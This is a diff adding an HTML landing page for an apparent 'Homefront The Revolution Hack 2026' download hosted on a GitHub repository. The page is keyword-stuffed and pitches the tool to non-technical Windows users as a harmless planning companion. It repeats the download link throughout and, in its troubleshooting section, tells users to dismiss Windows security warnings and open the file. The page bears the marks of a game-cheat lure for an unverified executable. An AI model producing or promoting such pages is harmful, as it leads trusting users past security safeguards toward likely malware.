@@ -1,0 +1,309 @@
+Here is a complete HTML/CSS landing page for the Homefront The Revolution Hack 2026 companion toolkit, optimized for non-technical Windows users. It presents download guidance, feature overviews, and system requirements in a clean, modern layout with a prominent call-to-action button and subtle card styling.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Homefront The Revolution Hack 2026 Resistance Toolkit - PC Companion Download</title>
+<meta name="description" content="Homefront The Revolution Hack 2026 themed PC companion for resistance builds, weapons, attachments, guerrilla loadouts, mission planning and progression analytics. Simple Windows download for non-technical users.">
+<meta name="keywords" content="homefront-revolution-hack-stealth-mode, homefront the revolution hack 2026, resistance toolkit, guerrilla loadouts, weapons attachments, mission planning, progression analytics, PC companion">
+<meta name="author" content="nyoks1337">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#ff6b35">
+<link rel="canonical" href="https://github.com/nyoks1337/homefront-the-revolution-hack-2026-resistance-toolkit">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Homefront The Revolution Hack 2026 Resistance Toolkit - PC Companion Download">
+<meta property="og:description" content="Plan resistance builds, weapons, attachments, guerrilla loadouts and mission routes with progression analytics on Windows.">
+<meta property="og:url" content="https://github.com/nyoks1337/homefront-the-revolution-hack-2026-resistance-toolkit">
+<meta property="og:site_name" content="homefront-the-revolution-hack-2026-resistance-toolkit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Homefront The Revolution Hack 2026 Resistance Toolkit">
+<meta name="twitter:description" content="A Windows companion for resistance builds, guerrilla loadouts, mission planning and progression analytics.">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f6f7f9;
+    color: #22262b;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 940px;
+    margin: 0 auto;
+    padding: 48px 22px 72px;
+  }
+  h1 {
+    font-size: 2.1rem;
+    line-height: 1.25;
+    letter-spacing: -0.4px;
+    margin: 0 0 18px;
+    color: #14181d;
+  }
+  h2 {
+    font-size: 1.42rem;
+    line-height: 1.3;
+    margin: 0 0 14px;
+    letter-spacing: -0.2px;
+    color: #14181d;
+  }
+  h3 {
+    font-size: 1.06rem;
+    margin: 0 0 8px;
+    color: #14181d;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 16px; padding-left: 22px; }
+  li { margin-bottom: 9px; }
+  a { color: #c2410c; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .lead {
+    font-size: 1.1rem;
+    color: #4a535d;
+    margin-bottom: 26px;
+  }
+  .hero {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 34px 30px 30px;
+    box-shadow: 0 6px 26px rgba(20, 24, 29, 0.08);
+    margin-bottom: 34px;
+  }
+  .badge-btn {
+    display: inline-block;
+    padding: 16px 30px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #ff6b35 0%, #e11d6f 55%, #7c3aed 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.02rem;
+    letter-spacing: 0.2px;
+    box-shadow: 0 8px 20px rgba(225, 29, 111, 0.28);
+    text-decoration: none;
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .badge-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(225, 29, 111, 0.34);
+    text-decoration: none;
+  }
+  .btn-note {
+    font-size: 0.9rem;
+    color: #6b7480;
+    margin: 14px 0 0;
+  }
+  section {
+    background: #ffffff;
+    border-radius: 14px;
+    padding: 28px 30px 18px;
+    margin-bottom: 22px;
+    box-shadow: 0 4px 16px rgba(20, 24, 29, 0.06);
+  }
+  .grid {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 16px;
+    margin-bottom: 8px;
+  }
+  .card {
+    flex: 1 1 260px;
+    background: #f9fafb;
+    border: 1px solid #e8eaee;
+    border-radius: 12px;
+    padding: 18px 20px;
+    box-shadow: 0 2px 8px rgba(20, 24, 29, 0.04);
+  }
+  .card p { margin-bottom: 0; font-size: 0.97rem; color: #4a535d; }
+  .download-box {
+    background: linear-gradient(135deg, #fff7ed 0%, #fdf2f8 100%);
+    border: 1px solid #fbd7bd;
+    border-radius: 12px;
+    padding: 22px 24px;
+    margin-top: 6px;
+  }
+  .download-box p:last-child { margin-bottom: 0; }
+  code {
+    background: #eef0f3;
+    padding: 2px 6px;
+    border-radius: 5px;
+    font-size: 0.92em;
+    color: #b91c1c;
+  }
+  footer {
+    text-align: center;
+    padding: 26px 12px 0;
+    font-size: 0.92rem;
+    color: #6b7480;
+  }
+  footer a { color: #c2410c; }
+  @media (max-width: 600px) {
+    body { font-size: 16px; }
+    .wrap { padding: 28px 16px 52px; }
+    h1 { font-size: 1.6rem; }
+    h2 { font-size: 1.22rem; }
+    .hero, section { padding: 22px 20px; }
+    .badge-btn { display: block; text-align: center; padding: 15px 18px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="hero">
+    <h1>🎮 homefront-the-revolution-hack-2026-resistance-toolkit - Plan Resistance Builds With Confidence</h1>
+    <p class="lead">A Windows companion app for resistance builds, weapons, attachments, guerrilla loadouts, mission planning and progression analytics — built for players who want a clear plan before every raid.</p>
+    <p>
+      <a class="badge-btn" href="https://github.com/nyoks1337/homefront-the-revolution-hack-2026-resistance-toolkit">⬇️ Get the Resistance Toolkit</a>
+    </p>
+    <p class="btn-note">Visit this link to download the application.</p>
+  </div>
+
+  <section>
+    <h2>🚀 Getting Started</h2>
+    <p>Getting the toolkit onto your Windows PC takes only a few minutes. You do not need any programming knowledge, and you do not need to build or compile anything. Everything you need lives on a single download page.</p>
+    <ol>
+      <li><strong>Visit this link to download the application:</strong> <a href="https://github.com/nyoks1337/homefront-the-revolution-hack-2026-resistance-toolkit">https://github.com/nyoks1337/homefront-the-revolution-hack-2026-resistance-toolkit</a></li>
+      <li><strong>Save the download to a folder you can find again.</strong> Your Windows PC normally places downloads in your <code>Downloads</code> folder. If you choose a different location, remember where you saved it.</li>
+      <li><strong>Open the downloaded file when the download finishes.</strong> Most browsers show a small notification at the bottom or top of the window. You can also open File Explorer and go to your <code>Downloads</code> folder to double-click the file yourself.</li>
+      <li><strong>Keep the application in its own folder.</strong> Your saved loadouts, mission notes and analytics history are stored next to the app, so a dedicated folder keeps everything together.</li>
+    </ol>
+    <div class="download-box">
+      <p><strong>Download link:</strong> <a href="https://github.com/nyoks1337/homefront-the-revolution-hack-2026-resistance-toolkit">https://github.com/nyoks1337/homefront-the-revolution-hack-2026-resistance-toolkit</a></p>
+      <p>Visit this link to download the application.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>🛡️ What This Toolkit Does</h2>
+    <p>The resistance toolkit is a planning companion. It sits next to your game and helps you think through every decision before you commit to it — which gear to carry, which attachment changes a weapon's handling, which mission route saves the most time, and how your progression is actually trending over a playthrough.</p>
+    <div class="grid">
+      <div class="card">
+        <h3>🧩 Resistance Builds</h3>
+        <p>Sketch out complete guerrilla builds and compare them side by side. See how different perk and gear combinations change your playstyle before you commit a single upgrade.</p>
+      </div>
+      <div class="card">
+        <h3>🔫 Weapons &amp; Attachments</h3>
+        <p>Browse a searchable catalogue of weapons and attachments with notes on handling, range and recoil so you know exactly what each part does to your setup.</p>
+      </div>
+      <div class="card">
+        <h3>🗺️ Mission Planning</h3>
+        <p>Lay out mission order, stealth approach and backup options. Keep a short plan for every district so you always know the next move.</p>
+      </div>
+      <div class="card">
+        <h3>📊 Progression Analytics</h3>
+        <p>Track what you have unlocked and what is still missing. Simple charts show where your playtime is going and which upgrades are worth chasing.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>🧰 Building a Guerrilla Loadout</h2>
+    <p>A strong loadout is not about carrying the most powerful weapon — it is about carrying the right tools for the mission in front of you. The toolkit guides you through the same decisions a resistance fighter would make before heading into a hostile district.</p>
+    <ul>
+      <li><strong>Choose your role first.</strong> Decide whether you are going quiet, going loud, or staying flexible. The loadout builder organises everything else around that choice.</li>
+      <li><strong>Pair your primary weapon with a purpose.</strong> A silent option for patrols, a heavier option for open fights, and a sidearm you can trust when things go wrong.</li>
+      <li><strong>Slot attachments with intent.</strong> Each attachment entry explains the trade-off, so you can see why a shorter barrel helps indoors and hurts you in open streets.</li>
+      <li><strong>Keep a backup plan.</strong> Save two or three loadouts per district so you can switch approach without rebuilding from scratch.</li>
+    </ul>
+    <p>Every saved loadout stays on your machine and can be edited at any time. Nothing is locked in permanently, so experimentation costs you nothing.</p>
+  </section>
+
+  <section>
+    <h2>🎯 Weapons, Attachments and Stealth Loadouts</h2>
+    <p>The weapons library is the heart of the companion app. Each entry collects the details that usually get lost between play sessions: what the weapon is good at, which attachments improve it, and which ones quietly make it worse.</p>
+    <h3>What you can do in the library</h3>
+    <ul>
+      <li>Filter weapons by category, handling profile or unlock stage.</li>
+      <li>Attach multiple parts to a weapon and read a plain-language summary of the combined effect.</li>
+      <li>Bookmark favourite combinations so they appear first the next time you open the app.</li>
+      <li>Tag setups as stealth, assault or hybrid profiles to match the way you play.</li>
+      <li>Add your own notes to any weapon or attachment for details the built-in data does not cover.</li>
+    </ul>
+    <p>Stealth-focused players get a dedicated view that highlights suppressed options, quiet movement gear and the attachments that keep a patrol from noticing you. It is the fastest way to answer the question: "what do I take if I want to avoid a firefight entirely?"</p>
+  </section>
+
+  <section>
+    <h2>🗺️ Mission Planning Made Simple</h2>
+    <p>Mission planning in the toolkit is a short, repeatable routine rather than a long checklist. For each district you plan, you record four things:</p>
+    <ol>
+      <li><strong>The objective</strong> — what you are actually there to accomplish.</li>
+      <li><strong>The approach</strong> — the route or angle you intend to take first.</li>
+      <li><strong>The loadout</strong> — which saved build you are bringing and why.</li>
+      <li><strong>The fallback</strong> — what you do if the quiet plan stops working.</li>
+    </ol>
+    <p>Because the plans are saved locally, you can reopen a district at any time and see exactly what you decided last time. That turns guesswork into a repeatable routine, and it makes long playthroughs feel far less scattered.</p>
+  </section>
+
+  <section>
+    <h2>📈 Progression Analytics</h2>
+    <p>Progression analytics give you a simple, readable picture of how your playthrough is developing. The app tracks the categories you care about most and turns them into clear summaries rather than raw numbers.</p>
+    <ul>
+      <li>Unlock coverage across weapons, attachments and gear.</li>
+      <li>Time spent per district so you can spot where you are stalling.</li>
+      <li>Loadout usage counts that show which builds you actually rely on.</li>
+      <li>A simple readiness view that highlights areas still missing upgrades.</li>
+    </ul>
+    <p>All analytics are calculated from your own saved data on your own computer. There is no account to create, no sign-in step and no cloud sync to configure.</p>
+  </section>
+
+  <section>
+    <h2>💻 System Requirements</h2>
+    <p>The toolkit is a lightweight desktop companion. It is designed to run comfortably alongside your game on an ordinary Windows machine.</p>
+    <ul>
+      <li><strong>Operating system:</strong> Windows 10 or Windows 11 (64-bit recommended).</li>
+      <li><strong>Processor:</strong> Any modern dual-core processor or better.</li>
+      <li><strong>Memory:</strong> 4 GB of RAM minimum; 8 GB recommended when running alongside the game.</li>
+      <li><strong>Storage:</strong> Around 250 MB of free space for the application and your saved data.</li>
+      <li><strong>Display:</strong> 1280 × 720 or higher resolution.</li>
+      <li><strong>Other:</strong> A standard mouse and keyboard. No additional software or account is required.</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>🧭 First-Time Setup Tips</h2>
+    <ul>
+      <li><strong>Create the saved folder before you start.</strong> A folder such as <code>Documents\ResistanceToolkit</code> keeps your plans, loadouts and analytics in one predictable place.</li>
+      <li><strong>Start with a single loadout.</strong> Build one setup that matches your usual playstyle, then branch out once you are comfortable with how the builder behaves.</li>
+      <li><strong>Use the notes fields.</strong> Every weapon, attachment and mission entry accepts free text. A sentence written after a session saves ten minutes of guessing later.</li>
+      <li><strong>Revisit analytics weekly.</strong> A quick look once a week is enough to spot upgrades you have overlooked.</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>❓ Troubleshooting and Common Questions</h2>
+    <h3>The download did not start — what should I do?</h3>
+    <p>Visit the download link again and repeat the download step. A slow connection can interrupt large transfers, and a second attempt usually resolves it.</p>
+    <h3>Windows showed a warning when I opened the file.</h3>
+    <p>Windows sometimes shows a caution prompt for files downloaded from the internet. Choose the option to keep and open the file, then continue.</p>
+    <h3>Where are my saved loadouts stored?</h3>
+    <p>Saved loadouts, plans and analytics live in the folder you placed the application in. Back that folder up if you want a copy of your work.</p>
+    <h3>Can I move the app to another computer?</h3>
+    <p>Yes. Copy the whole application folder to the new machine. Your plans and loadouts travel with it.</p>
+    <h3>Does the toolkit change my game files?</h3>
+    <p>The toolkit is a standalone planning companion. It reads nothing from your game installation and keeps all of its data in its own folder.</p>
+  </section>
+
+  <section>
+    <h2>🤝 Support and Feedback</h2>
+    <p>If something does not behave as expected, the fastest route is to open an issue on the repository. Include your Windows version and a short description of what you were doing when the problem appeared — that is usually enough to identify the cause quickly.</p>
+    <p>Feature suggestions are welcome as well. Requests for additional weapon entries, attachment details or new planning fields are reviewed regularly and folded into future updates.</p>
+    <div class="download-box">
+      <p><strong>Ready to plan your next raid?</strong></p>
+      <p><a href="https://github.com/nyoks1337/homefront-the-revolution-hack-2026-resistance-toolkit">https://github.com/nyoks1337/homefront-the-revolution-hack-2026-resistance-toolkit</a></p>
+      <p>Visit this link to download the application.</p>
+    </div>
+  </section>
+
+  <footer>
+    <p>homefront-the-revolution-hack-2026-resistance-toolkit · Windows PC companion for resistance builds, weapons, attachments, guerrilla loadouts, mission planning and progression analytics.</p>
+    <p><a href="https://github.com/nyoks1337/homefront-the-revolution-hack-2026-resistance-toolkit">Visit this link to download the application.</a></p>
+  </footer>
+
+</div>
+</body>
+</html>
+```
